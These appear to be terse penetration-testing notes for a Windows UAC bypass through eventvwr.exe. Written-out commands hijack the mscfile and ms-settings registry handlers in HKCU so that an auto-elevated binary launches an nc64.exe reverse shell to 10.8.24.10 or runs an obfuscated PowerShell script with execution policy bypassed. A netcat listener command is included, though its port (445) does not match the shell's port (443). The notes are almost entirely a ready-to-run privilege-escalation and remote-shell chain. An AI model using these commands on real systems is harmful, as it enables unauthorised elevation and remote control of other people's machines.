Eventwr

Check if auto elevate is linked to this particular executable:
powershell -C Get-Content -Path C:\Windows\System32\eventvwr.exe | findstr /I "autoElevate"

Next, we need to be cmd.exe for these registry settings
REG ADD HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command

REG ADD HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command /v DelegateExecute /t REG_SZ

REG ADD HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command /d "c:\windows\tasks\nc64.exe -nv 10.8.24.10 443 -e cmd.exe" /f

rlwrap nc -lvnp 445  (on kali ofc)

eventvwr

Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass C:\users\robert\downloads\work2\obfuscated.ps1" -Force

